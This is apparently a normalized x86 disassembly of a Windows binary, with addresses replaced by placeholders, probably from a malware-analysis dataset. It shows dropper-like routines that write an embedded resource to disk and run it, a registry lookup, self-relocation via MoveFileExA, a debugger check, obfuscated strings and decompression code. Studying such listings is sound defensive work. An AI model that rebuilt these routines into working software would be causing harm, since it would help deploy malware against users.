idiv [ ebp - 0x328 ]
add eax 0x1
push eax
mov edx [ ebp - 0x10c ]
push edx
push rw-data
push rw-data
lea eax [ ebp - 0x214 ]
push eax
call [ sprintf@IAT ]
add esp 0x18
push 0x104
push 0x0
lea ecx [ ebp - 0x108 ]
push ecx
call memset
add esp 0xc
lea edx [ ebp - 0x214 ]
push edx
lea eax [ ebp - 0x108 ]
push eax
call strcpy
add esp 0x8
mov ecx [ ebp - 0x110 ]
sub ecx [ ebp - 0x4 ]
cmp [ ebp - 0x328 ] ecx
jae r-xdata
mov edx [ ebp - 0x110 ]
sub edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x218 ]
add eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x108 ]
push ecx
call strlen
add esp 0x4
lea edx [ ebp + eax - 0x108 ]
push edx
call memcpy
add esp 0xc
push 0x1
push rw-data
lea eax [ ebp - 0x108 ]
push eax
call strlen
add esp 0x4
lea ecx [ ebp + eax - 0x108 ]
add ecx [ ebp - 0x110 ]
sub ecx [ ebp - 0x4 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0x328 ]
push edx
mov eax [ ebp - 0x218 ]
add eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x108 ]
push ecx
call strlen
add esp 0x4
lea edx [ ebp + eax - 0x108 ]
push edx
call memcpy
add esp 0xc
push 0x1
push rw-data
lea eax [ ebp - 0x108 ]
push eax
call strlen
add esp 0x4
lea ecx [ ebp + eax - 0x108 ]
add ecx [ ebp - 0x328 ]
push ecx
call memcpy
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x110 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x328 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x320 ]
add eax 0x1
mov [ ebp - 0x320 ] eax
push 0x0
push 0x0
push 0x104
lea ecx [ ebp - 0x31c ]
push ecx
lea edx [ ebp - 0x108 ]
push edx
push 0x0
call [ rw-data ]
jmp r-xdata
sub_4023a3
push ebp
mov ebp esp
sub esp 0x28
push esi
push edi
push 0x104
push 0x0
push rw-data
call memset
add esp 0xc
push 0x104
push rw-data
push rw-data
call [ ExpandEnvironmentStringsA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x0
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push rw-data
push rw-data
call strcat
add esp 0x8
push 0x0
push rw-data
call [ CreateDirectoryA@IAT ]
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
push rw-data
mov eax [ ebp - 0x28 ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
mov ecx 0x6
mov esi rw-data
lea edi [ ebp - 0x24 ]
[ edi ] [ esi ]
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] cx
movsx edx [ ebp - 0x24 ]
sub edx 0x1
mov [ ebp - 0x24 ] dl
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
call sub_4013c1
add esp 0x4
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x927c0
mov eax 0x1
xor eax eax
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_4024a2
push ebp
mov ebp esp
mov eax 0x950c
call sub_404980
push edi
push rw-data
call [ SetCurrentDirectoryA@IAT ]
mov [ ebp - 0x94c4 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x94c3 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x94c4 ]
push ecx
call strcpy
add esp 0x8
push rw-data
lea edx [ ebp - 0x94c4 ]
push edx
call strcat
add esp 0x8
push 0x44
push 0x0
lea eax [ ebp - 0x9508 ]
push eax
call memset
add esp 0xc
mov [ ebp - 0x9508 ] 0x44
push 0x10
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
call memset
add esp 0xc
lea edx [ ebp - 0x9508 ]
push edx
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x94d8 ] 0x0
mov [ ebp - 0x93b4 ] 0x0
mov ecx 0x3ff
xor eax eax
lea edi [ ebp - 0x93b3 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push rw-data
lea eax [ ebp - 0x93b4 ]
push eax
call strcpy
add esp 0x8
push rw-data
lea ecx [ ebp - 0x93b4 ]
push ecx
call strcat
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x93b4 ]
push eax
call strcat
add esp 0x8
push rw-data
lea ecx [ ebp - 0x93b4 ]
push ecx
call strcat
add esp 0x8
push rw-data
lea edx [ ebp - 0x93b4 ]
push edx
call strcat
add esp 0x8
lea eax [ ebp - 0x94c4 ]
push eax
lea ecx [ ebp - 0x93b4 ]
push ecx
call strcat
add esp 0x8
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0x9508 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x93b4 ]
push ecx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
push 0xffffffff
mov edx [ ebp - 0x14 ]
push edx
call [ WaitForSingleObject@IAT ]
mov eax [ ebp - 0x14 ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x10 ]
push ecx
call [ CloseHandle@IAT ]
push rw-data
lea edx [ ebp - 0x94c4 ]
push edx
call [ fopen@IAT ]
add esp 0x8
mov [ ebp - 0x950c ] eax
push 0x2
push 0x0
mov eax [ ebp - 0x950c ]
push eax
call [ fseek@IAT ]
add esp 0xc
mov ecx [ ebp - 0x950c ]
push ecx
call [ ftell@IAT ]
add esp 0x4
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
mov edx [ ebp - 0x950c ]
push edx
call [ fseek@IAT ]
add esp 0xc
mov eax [ ebp - 0x4 ]
add eax 0x1
push eax
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x93b8 ] eax
cmp [ ebp - 0x93b8 ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
push eax
push rw-data
call [ printf@IAT ]
add esp 0x8
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
push eax
push 0x0
mov ecx [ ebp - 0x93b8 ]
push ecx
call memset
add esp 0xc
mov edx [ ebp - 0x950c ]
push edx
mov eax [ ebp - 0x4 ]
push eax
push 0x1
mov ecx [ ebp - 0x93b8 ]
push ecx
call [ fread@IAT ]
add esp 0x10
mov edx [ ebp - 0x950c ]
push edx
call [ fclose@IAT ]
add esp 0x4
lea eax [ ebp - 0x94c4 ]
push eax
call [ DeleteFileA@IAT ]
lea ecx [ ebp - 0x83b4 ]
call sub_402c90
lea ecx [ ebp - 0x93bc ]
push ecx
lea edx [ ebp - 0x93c0 ]
push edx
mov eax [ ebp - 0x4 ]
add eax 0x1
push eax
mov ecx [ ebp - 0x93b8 ]
push ecx
lea ecx [ ebp - 0x83b4 ]
call sub_4044ba
push rw-data
mov edx [ ebp + 0xc ]
push edx
call [ fopen@IAT ]
add esp 0x8
mov [ ebp - 0x950c ] eax
cmp [ ebp - 0x950c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x950c ]
push ecx
call [ fclose@IAT ]
add esp 0x4
lea edx [ ebp - 0x94c4 ]
push edx
call [ DeleteFileA@IAT ]
xor eax eax
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x950c ]
push eax
mov ecx [ ebp - 0x93bc ]
push ecx
push 0x1
mov edx [ ebp - 0x93c0 ]
push edx
call [ fwrite@IAT ]
add esp 0x10
mov eax [ ebp - 0x950c ]
push eax
call [ fclose@IAT ]
add esp 0x4
mov ecx [ ebp - 0x93b8 ]
push ecx
call [ free@IAT ]
add esp 0x4
lea edx [ ebp - 0x93c0 ]
push edx
lea ecx [ ebp - 0x83b4 ]
call sub_404618
mov eax 0x1
xor eax eax
jmp r-xdata
sub_4027e0
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x8 ] 0x0
push 0x0
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x14 ] eax
push rw-data
mov eax [ ebp + 0xc ]
and eax 0xffff
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call [ FindResourceA@IAT ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
call [ LoadResource@IAT ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
call [ SizeofResource@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x1f01ff
mov eax [ ebp + 0x8 ]
push eax
call [ CreateFileA@IAT ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0xc ] edx
push rw-data
call strlen
add esp 0x4
push eax
push rw-data
mov eax [ ebp - 0xc ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp - 0xc ]
movsx edx [ ecx ]
sub edx 0x1
mov eax [ ebp - 0xc ]
mov [ eax ] dl
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x18 ]
push ecx
call [ FreeResource@IAT ]
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x1c ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x18 ]
push edx
call [ FreeResource@IAT ]
mov eax 0x1
mov [ ebp - 0x8 ] 0x0
push 0x0
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x20 ]
sub ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0x1c ]
push edx
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ ebp + 0x8 ]
push ecx
call [ DeleteFileA@IAT ]
mov edx [ ebp - 0x18 ]
push edx
call [ FreeResource@IAT ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jbe r-xdata
sub_40292a
push ebp
mov ebp esp
sub esp 0x10c
push edi
mov [ ebp - 0x10c ] 0x0
mov ecx 0x41
xor eax eax
lea edi [ ebp - 0x10b ]
[ edi ]
push 0x104
lea eax [ ebp - 0x10c ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x0
push rw-data
lea ecx [ ebp - 0x10c ]
push ecx
call [ strstr@IAT ]
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
push rw-data
mov edx [ ebp - 0x4 ]
push edx
call strcpy
add esp 0x8
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x66
lea eax [ ebp - 0x10c ]
push eax
call sub_4027e0
add esp 0x8
test eax eax
jne r-xdata
push 0x1
push 0x0
push 0x0
lea ecx [ ebp - 0x10c ]
push ecx
push rw-data
push 0x0
call [ ShellExecuteA@IAT ]
jmp r-xdata
sub_4029d4
push ebp
mov ebp esp
sub esp 0x8
push rw-data
mov eax [ ebp + 0x8 ]
push eax
call [ fopen@IAT ]
add esp 0x8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push rw-data
mov ecx [ ebp + 0xc ]
push ecx
call [ fopen@IAT ]
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_402a21
push ebp
mov ebp esp
sub esp 0x558
push edi
mov [ ebp - 0x110 ] 0x0
mov ecx 0x41
xor eax eax
lea edi [ ebp - 0x10f ]
[ edi ]
mov [ ebp - 0x424 ] 0x0
mov ecx 0x41
xor eax eax
lea edi [ ebp - 0x423 ]
[ edi ]
mov [ ebp - 0x31c ] 0x0
mov ecx 0x82
xor eax eax
lea edi [ ebp - 0x31b ]
[ edi ]
mov [ ebp - 0x504 ] 0x104
push 0x3
push rw-data
mov eax [ ebp + 0x8 ]
push eax
call [ strncmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push 0x104
lea edx [ ebp - 0x424 ]
push edx
push 0x0
call [ GetModuleFileNameA@IAT ]
push rw-data
lea eax [ ebp - 0x500 ]
push eax
call [ lstrcpyA@IAT ]
movsx ecx [ ebp - 0x500 ]
sub ecx 0x1
mov [ ebp - 0x500 ] cl
lea edx [ ebp - 0x438 ]
push edx
lea eax [ ebp - 0x500 ]
push eax
push 0x80000001
call [ RegOpenKeyA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0xbb8
call [ Sleep@IAT ]
mov ecx [ ebp + 0x8 ]
add ecx 0x3
push ecx
call [ DeleteFileA@IAT ]
mov [ ebp - 0x434 ] 0x0
xor ecx ecx
mov [ ebp - 0x433 ] ecx
mov [ ebp - 0x42f ] ecx
mov [ ebp - 0x42b ] cl
push rw-data
lea edx [ ebp - 0x434 ]
push edx
call [ lstrcpyA@IAT ]
movsx eax [ ebp - 0x434 ]
sub eax 0x1
mov [ ebp - 0x434 ] al
lea ecx [ ebp - 0x504 ]
push ecx
lea edx [ ebp - 0x31c ]
push edx
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea ecx [ ebp - 0x434 ]
push ecx
mov edx [ ebp - 0x438 ]
push edx
call [ RegQueryValueExA@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x438 ]
push eax
call [ RegCloseKey@IAT ]
push rw-data
lea ecx [ ebp - 0x31c ]
push ecx
call strcat
add esp 0x8
lea edx [ ebp - 0x424 ]
push edx
lea eax [ ebp - 0x31c ]
push eax
call strcmp
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
call sub_4015c0
call sub_40292a
push 0x44
push 0x0
lea ecx [ ebp - 0x558 ]
push ecx
call memset
add esp 0xc
mov [ ebp - 0x558 ] 0x44
push 0x10
push 0x0
lea edx [ ebp - 0x514 ]
push edx
call memset
add esp 0xc
push 0x2
lea eax [ ebp - 0x31c ]
push eax
lea ecx [ ebp - 0x424 ]
push ecx
call [ MoveFileExA@IAT ]
push rw-data
lea edx [ ebp - 0x31c ]
push edx
call strcat
add esp 0x8
lea eax [ ebp - 0x424 ]
push eax
lea ecx [ ebp - 0x31c ]
push ecx
call strcat
add esp 0x8
lea edx [ ebp - 0x514 ]
push edx
lea eax [ ebp - 0x558 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x31c ]
push ecx
push 0x0
call [ CreateProcessA@IAT ]
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x186a0
call [ Sleep@IAT ]
jmp r-xdata
mov edx 0x1
test edx edx
je r-xdata
sub_402c6b
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_402a21
add esp 0x4
xor eax eax
jmp r-xdata
pop ebp
retn 0x10
sub_402c9e
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x1001
jmp r-xdata
movsx ecx [ ebp - 0x4 ]
cmp ecx 0x1100
jg r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ eax + edx * 2 + 0x304a ] 0x1000
jmp r-xdata
movsx edx [ ebp - 0x4 ]
cmp edx 0x1000
jge r-xdata
mov ax [ ebp - 0x4 ]
add ax 0x1
mov [ ebp - 0x4 ] ax
mov esp ebp
pop ebp
retn
movsx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 2 + 0x524c ] 0x1000
jmp r-xdata
mov cx [ ebp - 0x4 ]
add cx 0x1
mov [ ebp - 0x4 ] cx
sub_402d11
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] 0x1
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
lea edx [ ecx + eax + 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax ]
add ecx 0x1001
mov [ ebp - 0x4 ] cx
movsx edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov [ eax + edx * 2 + 0x1048 ] 0x1000
movsx ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ edx + ecx * 2 + 0x304a ] 0x1000
mov eax [ ebp - 0x18 ]
mov [ eax + 0x1046 ] 0x0
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
movsx ecx [ eax + edx * 2 + 0x1048 ]
cmp ecx 0x1000
je r-xdata
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
movsx ecx [ eax + edx * 2 + 0x304a ]
cmp ecx 0x1000
je r-xdata
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov cx [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0x1048 ] cx
movsx edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov cx [ ebp - 0x4 ]
mov [ eax + edx * 2 + 0x524c ] cx
jmp r-xdata
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov cx [ eax + edx * 2 + 0x1048 ]
mov [ ebp - 0x4 ] cx
jmp r-xdata
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov cx [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0x304a ] cx
movsx edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov cx [ ebp - 0x4 ]
mov [ eax + edx * 2 + 0x524c ] cx
jmp r-xdata
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov cx [ eax + edx * 2 + 0x304a ]
mov [ ebp - 0x4 ] cx
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
movsx eax [ ebp - 0x10 ]
cmp eax 0x3c
jge r-xdata
movsx ecx [ ebp - 0x10 ]
cmp ecx 0x2
jle r-xdata
movsx ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
xor eax eax
mov al [ edx + ecx ]
movsx ecx [ ebp - 0x4 ]
movsx edx [ ebp - 0x10 ]
add edx [ ebp - 0x18 ]
xor ebx ebx
mov bl [ edx + ecx + 0x8 ]
sub eax ebx
mov [ ebp - 0x14 ] ax
movsx eax [ ebp - 0x14 ]
test eax eax
je r-xdata
jmp r-xdata
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
movsx ecx [ eax + 0x1046 ]
cmp edx ecx
jle r-xdata
jmp r-xdata
jmp r-xdata
movsx ecx [ ebp - 0x14 ]
test ecx ecx
jl r-xdata
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
movsx ecx [ eax + 0x1046 ]
cmp edx ecx
jne r-xdata
movsx edx [ ebp + 0x8 ]
movsx eax [ ebp - 0x4 ]
sub edx eax
and edx 0xfff
sub edx 0x1
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x1044 ] dx
mov edx [ ebp - 0x18 ]
mov ax [ ebp - 0x10 ]
mov [ edx + 0x1046 ] ax
movsx ecx [ ebp - 0x10 ]
cmp ecx 0x3c
jl r-xdata
mov dx [ ebp - 0x10 ]
add dx 0x1
mov [ ebp - 0x10 ] dx
movsx edx [ ebp + 0x8 ]
movsx eax [ ebp - 0x4 ]
sub edx eax
and edx 0xfff
sub edx 0x1
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dx [ ecx + 0x1044 ]
cmp [ ebp - 0x8 ] edx
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov cx [ ebp - 0x8 ]
mov [ eax + 0x1044 ] cx
movsx edx [ ebp - 0x4 ]
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov esi [ ebp - 0x18 ]
mov dx [ esi + edx * 2 + 0x524c ]
mov [ ecx + eax * 2 + 0x524c ] dx
movsx eax [ ebp - 0x4 ]
movsx ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
mov esi [ ebp - 0x18 ]
mov ax [ esi + eax * 2 + 0x1048 ]
mov [ edx + ecx * 2 + 0x1048 ] ax
movsx ecx [ ebp - 0x4 ]
movsx edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x18 ]
mov cx [ esi + ecx * 2 + 0x304a ]
mov [ eax + edx * 2 + 0x304a ] cx
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
movsx ecx [ eax + edx * 2 + 0x1048 ]
mov edx [ ebp - 0x18 ]
mov ax [ ebp + 0x8 ]
mov [ edx + ecx * 2 + 0x524c ] ax
movsx ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
movsx eax [ edx + ecx * 2 + 0x304a ]
mov ecx [ ebp - 0x18 ]
mov dx [ ebp + 0x8 ]
mov [ ecx + eax * 2 + 0x524c ] dx
movsx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x18 ]
movsx edx [ ecx + eax * 2 + 0x524c ]
mov eax [ ebp - 0x18 ]
movsx ecx [ eax + edx * 2 + 0x304a ]
movsx edx [ ebp - 0x4 ]
cmp ecx edx
jne r-xdata
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
movsx ecx [ eax + edx * 2 + 0x524c ]
mov edx [ ebp - 0x18 ]
mov ax [ ebp + 0x8 ]
mov [ edx + ecx * 2 + 0x1048 ] ax
movsx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x18 ]
movsx edx [ ecx + eax * 2 + 0x524c ]
mov eax [ ebp - 0x18 ]
mov cx [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0x304a ] cx
jmp r-xdata
movsx ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ edx + ecx * 2 + 0x524c ] 0x1000
sub_403023
push ebp
mov ebp esp
sub esp 0x8
push esi
mov [ ebp - 0x8 ] ecx
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
movsx edx [ ecx + eax * 2 + 0x524c ]
cmp edx 0x1000
jne r-xdata
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
movsx edx [ ecx + eax * 2 + 0x304a ]
cmp edx 0x1000
jne r-xdata
jmp r-xdata
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
movsx edx [ ecx + eax * 2 + 0x1048 ]
cmp edx 0x1000
jne r-xdata
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov dx [ ecx + eax * 2 + 0x1048 ]
mov [ ebp - 0x4 ] dx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov dx [ ecx + eax * 2 + 0x1048 ]
mov [ ebp - 0x4 ] dx
movsx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
movsx edx [ ecx + eax * 2 + 0x304a ]
cmp edx 0x1000
je r-xdata
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov dx [ ecx + eax * 2 + 0x304a ]
mov [ ebp - 0x4 ] dx
jmp r-xdata
movsx edx [ ebp + 0x8 ]
movsx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
mov dx [ esi + edx * 2 + 0x524c ]
mov [ ecx + eax * 2 + 0x524c ] dx
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
movsx edx [ ecx + eax * 2 + 0x524c ]
mov eax [ ebp - 0x8 ]
movsx ecx [ eax + edx * 2 + 0x304a ]
movsx edx [ ebp + 0x8 ]
cmp ecx edx
jne r-xdata
movsx edx [ ebp + 0x8 ]
movsx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
mov dx [ esi + edx * 2 + 0x304a ]
mov [ ecx + eax * 2 + 0x304a ] dx
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
movsx edx [ ecx + eax * 2 + 0x304a ]
mov eax [ ebp - 0x8 ]
mov cx [ ebp - 0x4 ]
mov [ eax + edx * 2 + 0x524c ] cx
movsx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov dx [ ecx + eax * 2 + 0x304a ]
mov [ ebp - 0x4 ] dx
movsx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
movsx edx [ ecx + eax * 2 + 0x304a ]
cmp edx 0x1000
jne r-xdata
movsx edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
movsx ecx [ eax + edx * 2 + 0x524c ]
mov edx [ ebp - 0x8 ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 2 + 0x1048 ] ax
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
movsx edx [ ecx + eax * 2 + 0x524c ]
mov eax [ ebp - 0x8 ]
mov cx [ ebp - 0x4 ]
mov [ eax + edx * 2 + 0x304a ] cx
jmp r-xdata
movsx eax [ ebp - 0x4 ]
movsx ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
movsx ecx [ edx + ecx * 2 + 0x524c ]
mov edx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
mov ax [ esi + eax * 2 + 0x1048 ]
mov [ edx + ecx * 2 + 0x304a ] ax
movsx ecx [ ebp - 0x4 ]
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
movsx edx [ eax + edx * 2 + 0x1048 ]
mov eax [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
mov cx [ esi + ecx * 2 + 0x524c ]
mov [ eax + edx * 2 + 0x524c ] cx
movsx edx [ ebp + 0x8 ]
movsx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
mov dx [ esi + edx * 2 + 0x1048 ]
mov [ ecx + eax * 2 + 0x1048 ] dx
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
movsx edx [ ecx + eax * 2 + 0x1048 ]
mov eax [ ebp - 0x8 ]
mov cx [ ebp - 0x4 ]
mov [ eax + edx * 2 + 0x524c ] cx
movsx ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + ecx * 2 + 0x524c ] 0x1000
sub_40325f
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov dx [ ecx + 0x8376 ]
mov [ ebp - 0x4 ] dx
mov eax [ ebp - 0x8 ]
mov cx [ eax + 0x8376 ]
shl cx 0x1
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8376 ] cx
mov eax [ ebp - 0x8 ]
mov cl [ eax + 0x8378 ]
sub cl 0x1
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8378 ] cl
mov eax [ ebp - 0x4 ]
and eax 0xffff
and eax 0x8000
sar eax 0xf
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
call sub_404464
mov [ ebp - 0x4 ] ax
mov edx [ ebp - 0x4 ]
and edx 0xffff
cmp edx 0xffff
jne r-xdata
mov eax [ ebp - 0x4 ]
and eax 0xffff
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx + 0x8378 ]
mov ecx 0x8
sub ecx edx
shl eax cl
mov ecx [ ebp - 0x8 ]
mov dx [ ecx + 0x8376 ]
or dx ax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8376 ] dx
mov ecx [ ebp - 0x8 ]
mov dl [ ecx + 0x8378 ]
add dl 0x8
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8378 ] dl
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax + 0x8378 ]
cmp ecx 0x8
jg r-xdata
sub_403333
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov dx [ ecx + 0x8376 ]
mov [ ebp - 0x4 ] dx
mov eax [ ebp - 0x8 ]
mov cx [ eax + 0x8376 ]
shl cx 0x8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8376 ] cx
mov eax [ ebp - 0x8 ]
mov cl [ eax + 0x8378 ]
sub cl 0x8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8378 ] cl
